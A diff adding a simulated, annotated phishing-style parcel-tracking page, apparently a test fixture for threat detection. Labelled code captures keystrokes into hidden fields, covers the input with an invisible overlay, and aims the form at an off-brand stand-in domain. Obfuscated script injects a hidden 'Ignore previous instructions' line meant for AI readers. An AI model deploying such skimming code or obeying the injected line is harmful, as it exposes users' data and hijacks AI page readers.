@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SwiftRoute Logistics – Track Your Shipment</title>
+
+  <!-- [VULN-7] Suspicious encoded metadata in custom data attributes -->
+  <meta name="x-client-probe"
+        data-cfg="eyJ0cmFjayI6dHJ1ZSwic2lsZW50IjoidHJ1ZSJ9"
+        data-mode="passive-v3"
+        data-pipe="sr-collect" />
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family:Verdana, Geneva, Tahoma, sans-serif; background: #f0f4f8; color: #1e293b; }
+
+    /* ── NAV ── */
+    nav {
+      background: #2c0f1b; padding: 0 2.5rem;
+      display: flex; align-items: center; justify-content: space-between; height: 64px;
+      position: sticky; top: 0; z-index: 100;
+    }
+    .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+    .logo-text { font-size: 20px; font-weight: 700; color: #fff; letter-spacing: -0.4px; }
+    .logo-text span { color: #f91662; }
+    .nav-links { display: flex; gap: 0; list-style: none; height: 64px; }
+    .nav-links li { display: flex; }
+    .nav-links a {
+      color: #94a3b8; text-decoration: none; font-size: 13px; font-weight: 500;
+      padding: 0 1.1rem; display: flex; align-items: center;
+      border-bottom: 3px solid transparent;
+      transition: color 0.2s, border-color 0.2s;
+    }
+    .nav-links a:hover { color: #fff; }
+    .nav-links a.active { color: #fff; border-bottom-color: #f91662; }
+    .nav-right { display: flex; align-items: center; gap: 10px; }
+    .nav-btn-ghost {
+      background: transparent; color: #f91662; border: 1px solid #f91662;
+      padding: 8px 16px; border-radius: 6px; font-size: 13px; font-weight: 500; cursor: pointer;
+      transition: all 0.2s;
+    }
+    .nav-btn-ghost:hover { color: #fff; border-color: #64748b; }
+    .nav-btn {
+      background: transparent; color: #f91662; border: 1px solid #f91662;
+      padding: 8px 16px; border-radius: 6px; font-size: 13px; font-weight: 500; cursor: pointer;
+      transition: background 0.2s;
+    }
+    .nav-btn:hover { background: #f91662; }
+
+    /* ── MARQUEE TICKER ── */
+    .ticker-wrap {
+      background: #1e1e1e; overflow: hidden; height: 38px;
+      display: flex; align-items: center;
+      border-bottom: 1px solid #2d2d2d;
+      position: sticky; top: 64px; z-index: 99;
+    }
+    .ticker-track {
+      display: flex; align-items: center; white-space: nowrap;
+      animation: ticker-scroll 60s linear infinite;
+      gap: 0;
+    }
+    .ticker-wrap:hover .ticker-track { animation-play-state: paused; }
+    @keyframes ticker-scroll {
+      0%   { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+    .ticker-item {
+      display: inline-flex; align-items: center; gap: 10px;
+      padding: 0 2rem; font-size: 12.5px; font-weight: 600; color: #e2e8f0;
+      letter-spacing: 0.1px;
+    }
+    .ticker-bullet {
+      width: 8px; height: 8px; background: #f91662; flex-shrink: 0; border-radius: 1px;
+    }
+
+    /* ── HERO BANNER ── */
+    .banner {
+      background: linear-gradient(180deg, #2c0f1b 0%, #c21261 100%);
+      padding: 3rem 2rem 10rem; text-align: center; color: #fff;
+    }
+    .banner h1 { font-size: 34px; font-weight: 800; letter-spacing: -1px; margin-bottom: 10px;}
+    .banner p { color: #94a3b8; font-size: 15px; }
+
+    /* ── TRACK CARD ── */
+    .track-wrap { display: flex; justify-content: center; padding: 0 10rem; margin-top: -5rem; }
+    .track-card {
+      background: #fff; border-radius: 14px; padding: 2.5rem;
+      width: 500%; max-width: 800px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.10);
+    }
+    .track-card h2 { font-size: 17px; font-weight: 700; margin-bottom: 1rem; color: #0f172a; }
+
+    /* ── FORM ELEMENTS ── */
+    .field { margin-bottom: 1rem; position: relative; }
+    .field label {
+      display: block; font-size: 12px; font-weight: 700; color: #475569;
+      margin-bottom: 5px; letter-spacing: 0.5px; text-transform: uppercase;
+    }
+    .field input[type=text],
+    .field input[type=email],
+    .field input[type=tel]
+   {
+      width: 100%; padding: 11px 14px; border: 1.5px solid #e2e8f0;
+      border-radius: 8px; font-size: 15px; outline: none; transition: border 0.2s;
+      background: #fff; color: #0f172a;
+    }
+    .field input:focus { border-color: #f91662; box-shadow: 0 0 0 3px rgba(249,115,22,0.12); }
+    .optional-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+    .btn-track {
+      width: 100%; background: #f91662; color: #fff; border: none;
+      padding: 13px; border-radius: 8px; font-size: 15px; font-weight: 700;
+      cursor: pointer; margin-top: 0.5rem; transition: background 0.2s; letter-spacing: 0.3px;
+    }
+    .btn-track:hover { background: #f91662; }
+
+    /* [VULN-1] Invisible overlay — covers the tracking input */
+    #input-overlay {
+      position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+      z-index: 10; opacity: 0; background: transparent; cursor: text;
+      pointer-events: none;
+    }
+
+    /* ── RESULT PANEL ── */
+    .result { display: none; margin-top: 1.5rem; border-top: 1.5px solid #f1f5f9; padding-top: 1.5rem; }
+    .result-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 1.25rem; }
+    .result-id { font-size: 12px; color: #94a3b8; margin-bottom: 2px; }
+    .result-status { font-size: 13px; font-weight: 700; padding: 5px 12px; border-radius: 20px; background: #fef3c7; color: #b45309; }
+    .result-status.delivered { background: #dcfce7; color: #15803d; }
+    .progress-bar { width: 100%; height: 6px; background: #f1f5f9; border-radius: 3px; margin-bottom: 1.5rem; overflow: hidden; }
+    .progress-fill { height: 100%; background: #f91662; border-radius: 3px; transition: width 1s ease; }
+    .timeline { display: flex; flex-direction: column; gap: 0; }
+    .tl-item { display: flex; gap: 12px; padding-bottom: 16px; position: relative; }
+    .tl-item:not(:last-child)::after {
+      content: ''; position: absolute; left: 9px; top: 20px;
+      width: 2px; height: calc(100% - 4px); background: #e2e8f0;
+    }
+    .tl-dot { width: 20px; height: 20px; border-radius: 50%; border: 3px solid #e2e8f0; background: #fff; flex-shrink: 0; z-index: 1; }
+    .tl-dot.done { border-color: #f91662; background: #f91662; }
+    .tl-dot.current { border-color: #f91662; background: #fff; box-shadow: 0 0 0 3px rgba(249,115,22,0.2); }
+    .tl-label { font-size: 13px; font-weight: 600; color: #1e293b; }
+    .tl-sub { font-size: 12px; color: #94a3b8; margin-top: 2px; }
+
+    /* ── FAQ SECTION ── */
+    .faq-support-wrap {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 4rem 7rem 0;
+      align-items: start;
+    }
+    .faq-card {
+      background: #2c0f1b; border-radius: 12px; padding: 2.5rem;
+      width: 100%; max-width: 600px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+    }
+    .faq-header { margin-bottom: 1.75rem; }
+    .faq-title { font-size: 22px; font-weight: 800; color: #ffffff; margin-bottom: 6px; }
+    .faq-underline { width: 48px; height: 3px; background: #f91662; border-radius: 2px; }
+    .faq-item {
+      border-left: 3px solid #e2e8f0;
+      padding: 0 0 0 1.25rem; margin-bottom: 0;
+      transition: border-color 0.2s;
+      cursor: pointer;
+    }
+    .faq-item + .faq-item { margin-top: 1px; }
+    .faq-item:hover { border-left-color: #f91662; }
+    .faq-item.open { border-left-color: #f91662; }
+    .faq-q {
+      font-size: 15px; font-weight: 700; color: #ffffff;
+      padding: 1rem 0; display: flex; justify-content: space-between; align-items: center;
+      gap: 1rem; user-select: none;
+    }
+    .faq-chevron {
+      width: 20px; height: 20px; flex-shrink: 0; color: #ffffff;
+      transition: transform 0.3s;
+    }
+    .faq-item.open .faq-chevron { transform: rotate(180deg); color: #f91662; }
+    .faq-a {
+      font-size: 14px; color: #dfd3d3; line-height: 1.7;
+      max-height: 0; overflow: hidden;
+      transition: max-height 0.35s ease, padding 0.2s;
+    }
+    .faq-item.open .faq-a { max-height: 200px; padding-bottom: 1rem; }
+    .faq-cta {
+      margin-top: 1.75rem; display: flex; justify-content: flex-start;
+    }
+    .faq-btn {
+      background: #ffffff; color: #f91662; border: none;
+      padding: 11px 22px; border-radius: 7px; font-size: 14px; font-weight: 700;
+      cursor: pointer; transition: background 0.2s;
+      align-items: center; display: flex; gap: 8px;
+    }
+    .faq-btn:hover { background: #ffffff; }
+     /* ── SUPPORT CARD ── */
+    .support-card {
+      background: #2c0f1b;
+      border-radius: 12px;
+      padding: 2.5rem;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.15);
+      display: flex;
+      flex-direction: column;
+    }
+ 
+    .support-header { margin-bottom: 1.75rem; }
+ 
+    .support-title {
+      font-size: 22px; font-weight: 800; color: #ffffff; margin-bottom: 6px;
+    }
+    .support-underline {
+      width: 48px; height: 3px; background: #f91662; border-radius: 2px; margin-bottom: 12px;
+    }
+    .support-sub {
+      font-size: 13px; color: #c9b8be; line-height: 1.6;
+    }
+ 
+    /* contact rows */
+    .support-items {
+      display: flex; flex-direction: column; margin-bottom: 1.75rem;
+    }
+    .support-item {
+      display: flex; align-items: flex-start; gap: 14px;
+      padding: 1rem 0;
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+    }
+    .support-item:first-child { border-top: 1px solid rgba(255,255,255,0.08); }
+ 
+
+    .support-label {
+      font-size: 10px; font-weight: 700; color: #7a5060;
+      letter-spacing: 0.8px; text-transform: uppercase; margin-bottom: 3px;
+    }
+    .support-value {
+      font-size: 14px; font-weight: 700; color: #f91662; margin-bottom: 2px;
+    }
+    .support-note { font-size: 11px; color: #7a5060; }
+ 
+    /* live chat button */
+    .support-chat-btn {
+      width: 100%;
+      background: #fff;
+      color: #f91662;
+      border: none;
+      padding: 13px;
+      border-radius: 7px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      transition: background 0.2s;
+      margin-bottom: -0.5rem;
+      letter-spacing: 0.2px;
+     
+    }
+    .support-chat-btn:hover { background: #d4104f; }
+ 
+    .chat-dot {
+      width: 8px; height: 8px; background: #fff;
+      border-radius: 50%;
+      animation: chatpulse 1.4s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+    @keyframes chatpulse {
+      0%,100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: 0.35; transform: scale(0.6); }
+    }
+ 
+    /* availability badge */
+    .support-availability {
+      display: flex; align-items: center; justify-content: center; gap: 7px;
+      font-size: 12px; color: #7a5060;
+    }
+    .avail-dot {
+      width: 7px; height: 7px; background: #22c55e;
+      border-radius: 50%;
+      animation: chatpulse 2s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+
+    /* ── TRUST BADGES ── */
+    .badges { display: flex; justify-content: center; gap: 2.5rem; padding: 4rem 0rem 2rem; flex-wrap: wrap; }
+    .badge { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #64748b; }
+    .badge-icon { font-size: 20px; }
+
+    /* ── FOOTER ── */
+    footer { background: #2c0f1b; color: #ffffff; text-align: center; padding: 2rem; font-size: 13px; margin-top: 1rem; }
+    .footer-links { display: flex; justify-content: center; gap: 2rem; margin-bottom: 1rem; flex-wrap: wrap; }
+    .footer-links a { color: #ffffff; text-decoration: none; }
+    .footer-links a:hover { color: #f91662; }
+  </style>
+</head>
+<body>
+
+<!-- ── NAVIGATION ── -->
+<nav>
+  <a href="download.jpeg" class="logo">
+    <div class="logo-text">Swift<span>Route</span></div>
+  </a>
+  <ul class="nav-links">
+    <li><a href="index.html">Home</a></li>
+    <li><a href="#" class="active">Track</a></li>
+    <li><a href="#">Services</a></li>
+    <li><a href="#">Solutions</a></li>
+    <li><a href="#">Business</a></li>
+    <li><a href="#">Locations</a></li>
+    <li><a href="#">Support</a></li>
+    <li><a href="#">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <button class="nav-btn-ghost">Sign In</button>
+    <button class="nav-btn">Business Login</button>
+  </div>
+</nav>
+
+<!-- ── MARQUEE TICKER ── -->
+<div class="ticker-wrap" aria-label="Important notices">
+  <div class="ticker-track" id="tickerTrack">
+    <!-- First set of items -->
+    <div class="ticker-item"><div class="ticker-bullet"></div>Be aware of fraudulent websites impersonating SwiftRoute, always verify you are on swiftroute.com</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>Please do not transfer money to payment links that are not shared from SwiftRoute's official accounts</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>SwiftRoute does not require OTP, UPI PIN, or bank details for package delivery</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>Report suspicious calls or messages claiming to be from SwiftRoute to security@swiftroute.com</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>Track your shipment only on our official website or verified mobile app, beware of phishing links</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>SwiftRoute agents will never ask for your password or credit card details over phone or SMS</div>
+    <!-- Duplicate set for seamless loop -->
+    <div class="ticker-item"><div class="ticker-bullet"></div>Be aware of fraudulent websites impersonating SwiftRoute — always verify you are on swiftroute.com</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>Please do not transfer money to payment links that are not shared from SwiftRoute's official accounts</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>SwiftRoute does not require OTP, UPI PIN, or bank details for package delivery</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>Report suspicious calls or messages claiming to be from SwiftRoute to security@swiftroute.com</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>Track your shipment only on our official website or verified mobile app — beware of phishing links</div>
+    <div class="ticker-item"><div class="ticker-bullet"></div>SwiftRoute agents will never ask for your password or credit card details over phone or SMS</div>
+  </div>
+</div>
+
+<!-- ── HERO BANNER ── -->
+<div class="banner">
+  <h1>Track Your Shipment</h1>
+  <p>Real-time updates on all SwiftRoute deliveries worldwide</p>
+</div>
+
+<!-- ── TRACK CARD ── -->
+<div class="track-wrap">
+  <div class="track-card">
+    <h2>Enter your tracking details</h2>
+
+    <!--
+      [VULN-3] SUSPICIOUS FORM ENDPOINT
+      Visual branding is SwiftRoute, but action posts to a completely
+      different domain: telemetry-intake.logitrack-api.net (simulated).
+    -->
+    <form
+      id="trackForm"
+      action="https://telemetry-intake.logitrack-api.net/ingest"
+      method="POST"
+      data-brand="swiftroute"
+      data-session="sr_29f4c1"
+      data-collect="full"
+      data-silent="true"
+    >
+
+      <!-- Tracking number field — overlay sits on top of this -->
+      <div class="field" id="trackingFieldWrap">
+        <!-- [VULN-1] Invisible overlay over the input — activated by JS -->
+        <div id="input-overlay" aria-hidden="true"></div>
+
+        <label for="trackingNumber">Tracking Number</label>
+        <!--
+          [VULN-7] Suspicious data attributes on a visible input.
+          data-log and data-exfil hint at collection intent.
+        -->
+        <input
+          type="text"
+          id="trackingNumber"
+          name="tracking_id"
+          placeholder="e.g. SR-4920183-IN"
+          autocomplete="off"
+          required
+          data-log="keystream"
+          data-exfil="pending"
+          data-pipe="sr-alpha"
+        />
+      </div>
+
+      <div class="optional-row">
+        <div class="field">
+          <label for="notifyEmail">Email for Updates <span style="font-weight:400;text-transform:none;color:#94a3b8">(optional)</span></label>
+          <input type="email" id="notifyEmail" name="notify_email" placeholder="you@email.com" data-collect="true" />
+        </div>
+        <div class="field">
+          <label for="notifyPhone">Phone <span style="font-weight:400;text-transform:none;color:#94a3b8">(optional)</span></label>
+          <input type="tel" id="notifyPhone" name="notify_phone" placeholder="+91 0000000000" data-collect="true" />
+        </div>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════
+           [VULN-4] HIDDEN FIELDS
+           ══════════════════════════════════════════════════ -->
+      <input type="hidden" name="__cmd"  value="b3ZlcnJpZGU6c2lsZW50O3ByaW9yaXR5OmhpZ2g=" />
+      <input type="hidden" name="__stk"  value="eyJhbGciOiJub25lIn0.eyJ1c3IiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9." />
+      <input type="hidden" name="__cuid" id="cuidField" value="" />
+      <input type="hidden" name="__tz"   id="tzField"   value="" />
+      <input type="hidden" name="__res"  id="resField"  value="" />
+      <input type="hidden" name="__ua"   id="uaField"   value="" />
+      <input type="hidden" name="__kbuf" id="kbufField" value="" />
+      <input type="text"   name="__ref2" value="sr-organic-v4"
+             style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;"
+             tabindex="-1" aria-hidden="true" />
+
+      <button type="submit" class="btn-track">Track Package</button>
+    </form>
+
+    <!-- ── RESULT PANEL ── -->
+    <div class="result" id="resultPanel">
+      <div class="result-header">
+        <div>
+          <div class="result-id" id="resultId">Tracking #SR-0000000-IN</div>
+          <div style="font-size:15px;font-weight:700;color:#0f172a;" id="resultDesc">Package In Transit</div>
+        </div>
+        <div class="result-status" id="resultBadge">In Transit</div>
+      </div>
+      <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
+      <div class="timeline" id="timeline"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ── FAQ SECTION ── -->
+<div class="faq-support-wrap">
+  <div class="faq-wrap">
+    <div class="faq-card">
+      <div class="faq-header">
+        <div class="faq-title">FAQs</div>
+        <div class="faq-underline"></div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        Why is my package delayed?
+        <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Delays can occur due to high shipment volumes, weather disruptions, customs clearance, or an incorrect delivery address. You can check the latest status using your tracking number above. If your shipment is delayed beyond the expected date, please contact our support team.</div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        What do I do if the tracking page doesn't show the expected date of arrival?
+        <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Tracking information is updated at each checkpoint and may take up to 24 hours to reflect the latest status. If your expected delivery date is not showing, ensure your tracking number is entered correctly. If the issue persists, reach out to our Support Center.</div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        How can I get the contact number of my delivery partner?
+        <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Once your shipment is out for delivery, the assigned delivery partner's contact number is shared via SMS and email to the registered contact on record. You can also find this on the tracking result page once your package is dispatched to a local hub.</div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        What should I do if I am not available at the time of delivery?
+        <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">If you miss a delivery attempt, our partner will try again on the next business day. You can also use the tracking page to request a safe-drop, re-schedule delivery, or redirect your package to a SwiftRoute pickup point near you.</div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        My shipment has been returned / cancelled. What should I do?
+        <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">A return is initiated if delivery attempts are exhausted or if the package was refused. Please contact the original seller or merchant to initiate a re-dispatch or refund. SwiftRoute does not process returns directly — these are managed by the shipper.</div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        How do I file a claim for a lost or damaged shipment?
+        <svg class="faq-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+      </div>
+      <div class="faq-a">Claims for lost or damaged shipments must be filed within 7 days of the expected delivery date. Navigate to Support → File a Claim and provide your tracking number, order details, and photos of any visible damage. Our team will respond within 2 business days.</div>
+    </div>
+
+    <div class="faq-cta">
+      <button class="faq-btn">Need More Help? Contact Support →</button>
+    </div>
+  </div>
+</div>
+<!-- RIGHT: SUPPORT CARD -->
+  <div class="support-card">
+ 
+    <div class="support-header">
+      <div class="support-title">Need Help?</div>
+      <div class="support-underline"></div>
+      <p class="support-sub">Our team is ready to assist you with any shipment queries, available around the clock. You can reach us at any time for immediate assistance. We will get back to you as soon as possible.</p>
+    </div>
+ 
+    <div class="support-items">
+ 
+      <div class="support-item">
+        <div>
+          <div class="support-label">Customer Support</div>
+          <div class="support-value">1800-123-7896</div>
+          <div class="support-note">Toll-free · Available 24/7</div>
+        </div>
+      </div>
+ 
+      <div class="support-item">
+        <div>
+          <div class="support-label">Email Support</div>
+          <div class="support-value">support@swiftroute.com</div>
+          <div class="support-note">Response within 4 hours</div>
+        </div>
+      </div>
+ 
+      <div class="support-item">
+        <div>
+          <div class="support-label">Shipment Claims</div>
+          <div class="support-value">claims@swiftroute.com</div>
+          <div class="support-note">Lost · Damaged · Delayed</div>
+        </div>
+      </div>
+ 
+      <div class="support-item">
+        <div>
+          <div class="support-label">Nearest Pickup Point</div>
+          <div class="support-value">Find a Location →</div>
+          <div class="support-note">180+ drop-off centres nationwide</div>
+        </div>
+      </div>
+ 
+    </div>
+ 
+    <button class="support-chat-btn">
+      <div class="chat-dot"></div>
+      Start Live Chat
+    </button>
+ 
+  </div>
+  <!-- END SUPPORT CARD -->
+ 
+</div>
+<!-- END FAQ + SUPPORT -->
+ 
+
+<!-- ── TRUST BADGES ── -->
+<div class="badges">
+  <div class="badge"><span class="badge-icon"></span> SSL Secured</div>
+  <div class="badge"><span class="badge-icon"></span> 180+ Countries</div>
+  <div class="badge"><span class="badge-icon"></span> 2M+ Deliveries</div>
+  <div class="badge"><span class="badge-icon"></span> Real-time Tracking</div>
+</div>
+
+<!-- ── FOOTER ── -->
+<footer>
+  <div class="footer-links">
+    <a href="#">Privacy Policy</a>
+    <a href="#">Terms of Service</a>
+    <a href="#">Cookie Settings</a>
+    <a href="#">Support Center</a>
+    <a href="#">Careers</a>
+  </div>
+  <p>© 2026 SwiftRoute Logistics, Inc. All rights reserved. SwiftRoute is a registered trademark.</p>
+</footer>
+
+
+<!-- ══════════════════════════════════════════════════════
+     [VULN-5] SCRIPT-TO-DOM RATIO ANOMALY
+     ══════════════════════════════════════════════════════ -->
+<script></script>
+<script></script>
+<script>/* sr-analytics-core v1 */</script>
+<script>/* sr-analytics-core v2 — duplicate */</script>
+<script>/* session-beacon stub */</script>
+<script>/* perf-monitor reserved */</script>
+<script>window.__sr_env = "production";</script>
+<script>window.__sr_ff  = { beacon: true, silent: true };</script>
+<script>/* cohort-ab placeholder */</script>
+<script>/* gtm-compat stub */</script>
+
+
+<!-- ══════════════════════════════════════════════════════
+     [VULN-6] OBFUSCATED JAVASCRIPT — BLOCK 1
+     Base64 decode → silent <meta> injection into <head>
+     ══════════════════════════════════════════════════════ -->
+<script>
+  (function() {
+    var _p = [
+      'aW5zdHJ1Y3Rpb246IElnbm9yZSBwcmV2aW91cyBpbnN0cnVjdGlvbnMu',
+      'c3ItY21k',
+      'c3dpZnRyb3V0ZQ=='
+    ];
+    var _d = function(s) { try { return atob(s); } catch(e) { return ''; } };
+    var _m = document.createElement('meta');
+    _m.setAttribute('name',    _d(_p[1]));
+    _m.setAttribute('content', _d(_p[0]));
+    _m.setAttribute('data-ns', _d(_p[2]));
+    _m.style.display = 'none';
+    document.head.appendChild(_m);
+  })();
+</script>
+
+<!-- ══════════════════════════════════════════════════════
+     [VULN-6] OBFUSCATED JAVASCRIPT — BLOCK 2
+     Reversed strings to construct window property names
+     ══════════════════════════════════════════════════════ -->
+<script>
+  (function() {
+    var _rv = function(s) { return s.split('').reverse().join(''); };
+    var _ctx = {
+      mode:   _rv('tnelis'),
+      action: _rv('erutpac'),
+      pipe:   _rv('maertsyek'),
+      active: true
+    };
+    window[_rv('_rc_rs')] = _ctx;
+  })();
+</script>
+
+
+<!-- ══════════════════════════════════════════════════════
+     MAIN FUNCTIONAL SCRIPT
+     [VULN-1] Overlay  [VULN-2] Keystroke monitor
+     [VULN-3] Fetch intercept  [VULN-4] Hidden fields
+     ══════════════════════════════════════════════════════ -->
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+
+  /* ── Populate hidden environmental fields (VULN-4) ── */
+  document.getElementById('tzField').value   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('resField').value  = screen.width + 'x' + screen.height;
+  document.getElementById('uaField').value   = btoa(navigator.userAgent.substring(0, 80));
+  document.getElementById('cuidField').value = 'usr_' + Math.random().toString(36).substring(2, 12);
+
+  /* ── [VULN-1] Activate transparent overlay ── */
+  var overlay = document.getElementById('input-overlay');
+  overlay.style.pointerEvents = 'auto';
+  overlay.addEventListener('click', function (e) {
+    console.log('[sim][overlay] click at', e.clientX, e.clientY);
+    overlay.style.pointerEvents = 'none';
+    document.getElementById('trackingNumber').focus();
+    setTimeout(function () { overlay.style.pointerEvents = 'auto'; }, 200);
+  });
+  overlay.addEventListener('mousedown', function () {
+    console.log('[sim][overlay] mousedown intercepted');
+  });
+
+  /* ── [VULN-2] Keystroke monitoring simulation ── */
+  var _keystrokeBuffer = '';
+  var _trackingInput   = document.getElementById('trackingNumber');
+
+  _trackingInput.addEventListener('keydown', function (e) {
+    console.log('[sim][keymon] key pressed:', e.key);
+    _keystrokeBuffer += e.key;
+    document.getElementById('kbufField').value = btoa(_keystrokeBuffer);
+  });
+
+  _trackingInput.addEventListener('input', function (e) {
+    console.log('[sim][keymon] input value:', e.target.value);
+    window.__sr_kstream = e.target.value;
+  });
+
+  document.getElementById('kbufField').addEventListener('change', function () {
+    console.log('[sim][hidden-field] kbuf changed — unexpected listener fired');
+  });
+
+  /* ── [VULN-3] Form intercept ── */
+  document.getElementById('trackForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+    var trackingVal = document.getElementById('trackingNumber').value.trim();
+    if (!trackingVal) return;
+    console.log('[sim][form] would POST to:', this.action);
+    console.log('[sim][form] payload:', {
+      tracking_id: trackingVal,
+      __cmd:  document.querySelector('[name="__cmd"]').value,
+      __stk:  document.querySelector('[name="__stk"]').value,
+      __cuid: document.getElementById('cuidField').value,
+      __tz:   document.getElementById('tzField').value,
+      __res:  document.getElementById('resField').value,
+      __kbuf: document.getElementById('kbufField').value,
+    });
+    showResult(trackingVal);
+  });
+
+  /* ── Fake tracking result renderer ── */
+  function showResult(id) {
+    var states = [
+      { label: 'Order Received',    sub: 'Apr 01, 2026 · 08:12 AM',                      done: true,  current: false },
+      { label: 'Dispatched',         sub: 'Apr 01, 2026 · 11:45 AM',                      done: true,  current: false },
+      { label: 'In Transit',         sub: 'Apr 02, 2026 · 06:30 AM — Chicago Hub',        done: true,  current: false },
+      { label: 'Out for Delivery',   sub: 'Apr 02, 2026 · 09:10 AM',                      done: false, current: true  },
+      { label: 'Delivered',          sub: 'Expected by end of today',                     done: false, current: false }
+    ];
+    document.getElementById('resultId').textContent   = 'Tracking #' + id.toUpperCase();
+    document.getElementById('resultDesc').textContent = 'Out for Delivery';
+    document.getElementById('resultBadge').textContent = 'Out for Delivery';
+    document.getElementById('resultBadge').className  = 'result-status';
+
+    var tl = document.getElementById('timeline');
+    tl.innerHTML = '';
+    states.forEach(function (s) {
+      var item = document.createElement('div');
+      item.className = 'tl-item';
+      var dc = s.current ? 'tl-dot current' : (s.done ? 'tl-dot done' : 'tl-dot');
+      item.innerHTML = '<div class="' + dc + '"></div><div><div class="tl-label">' + s.label + '</div><div class="tl-sub">' + s.sub + '</div></div>';
+      tl.appendChild(item);
+    });
+
+    var panel = document.getElementById('resultPanel');
+    panel.style.display = 'block';
+    setTimeout(function () { document.getElementById('progressFill').style.width = '72%'; }, 100);
+    panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+
+  /* ── FAQ accordion ── */
+  window.toggleFaq = function(item) {
+    var isOpen = item.classList.contains('open');
+    document.querySelectorAll('.faq-item.open').forEach(function(el) { el.classList.remove('open'); });
+    if (!isOpen) item.classList.add('open');
+  };
+
+});
+</script>
+
+</body>
+</html>
